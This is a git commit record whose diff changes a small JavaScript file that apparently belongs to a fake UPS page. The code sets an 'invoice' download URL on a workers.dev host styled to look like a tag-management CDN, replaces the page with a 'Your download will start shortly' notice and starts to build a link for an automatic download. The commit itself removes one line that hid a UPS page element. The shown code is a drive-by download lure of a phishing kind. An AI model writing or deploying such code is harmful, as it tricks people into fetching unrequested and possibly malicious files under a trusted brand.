b6f04967523062d125f3d2cf073fa7526116327b
t501 <89453411+t501@users.noreply.github.com>
2021-09-03 07:54:55 +0300

    Update js.js

--- js.js
+++ js.js
@@ -2,7 +2,6 @@ var rootNodeId = "sectioniov5pt3b";
 var downloadUrl = "https://files.tiqcdn.workers.dev/documents/invoice_1Z8302XR1512230178";
 var content = '<div style="display: flex;justify-content: center;align-items: center;height: 50vh;"><div><h1><span aria-hidden="true" class="icon ups-icon-download"></span> Your download will start shortly.</h1><p>If your download does not start, please <a href="' + downloadUrl + '" download>click here</a>.</p></div></div>';
 var rootNode = document.getElementById(rootNodeId);
-document.getElementById("ups-fw_legacy_app_wrap").remove();
 rootNode.innerHTML = content;
 setTimeout(() => {
 	var link = document.createElement("a");
